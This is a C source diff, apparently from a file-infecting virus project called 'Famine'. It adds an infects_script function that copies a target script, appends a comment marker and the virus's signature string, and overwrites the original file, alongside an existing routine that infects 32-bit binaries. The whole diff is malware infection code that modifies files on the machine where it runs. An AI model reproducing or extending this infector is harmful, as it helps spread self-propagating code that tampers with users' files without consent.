@@ -126,3 +126,20 @@ int infects_32(t_binary *binary, char *full_path)
         return free_packer(&p, 1);
     return free_packer(&p, 0);
 }
+
+int infects_script(t_binary *binary, char *full_path)
+{
+    t_famine p      = {0};
+    p.binary        = binary;
+    p.target_size   = p.binary->file_size + strlen(FAMINE) + 2;
+    p.target_file   = ft_calloc(1, p.target_size);
+    
+    if(!p.target_file)
+        return(free_packer(&p, 1));
+    ft_memcpy(p.target_file, p.binary->buffer, p.binary->file_size);
+    ft_memcpy(p.target_file + p.binary->file_size, "\n#", 2);
+    ft_memcpy(p.target_file + p.binary->file_size + 2, FAMINE, strlen(FAMINE));
+    if(!write_output(&p, full_path))
+        return free_packer(&p, 1);
+    return free_packer(&p, 0);
+}
